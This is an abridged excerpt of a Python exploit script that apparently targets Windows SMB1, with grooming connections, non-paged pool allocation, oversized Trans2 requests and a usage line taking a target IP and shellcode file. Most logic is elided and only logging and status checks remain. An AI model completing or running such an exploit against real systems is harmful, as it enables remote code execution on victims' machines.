...
def sendEcho(conn, tid, data):
    ...
    if recvPkt.getNTStatus() == 0:
        logger.log.debug('got good ECHO response')
    else:
        logger.log.debug('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))
...
def createSessionAllocNonPaged(target, size):
    ...
    recvPkt = conn.recvSMB()
    if recvPkt.getNTStatus() == 0:
        logger.log.debug('SMB1 session setup allocate nonpaged pool success')
        return conn
    ...
    # lazy to check error code, just logger.log.debug fail message
    logger.log.debug('SMB1 session setup allocate nonpaged pool failed')
    sys.exit(1)
...
def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
    ...
    if recvPkt.getNTStatus() == 0:
        logger.log.debug('got good NT Trans response')
    else:
        logger.log.debug('got bad NT Trans response: 0x{:x}'.format(recvPkt.getNTStatus()))
        sys.exit(1)
...
def exploit(target, shellcode, numGroomConn):
    ...
    if retStatus == 0xc000000d:
        logger.log.debug('good response status for nx: INVALID_PARAMETER')
    else:
        logger.log.debug('bad response status for nx: 0x{:08x}'.format(retStatus))
...
'''
if len(sys.argv) < 3:
    logger.log.debug("{} <ip> <shellcode_file> [numGroomConn]".format(sys.argv[0]))
    sys.exit(1)
...
logger.log.debug('shellcode size: {:d}'.format(len(sc)))
logger.log.debug('numGroomConn: {:d}'.format(numGroomConn))
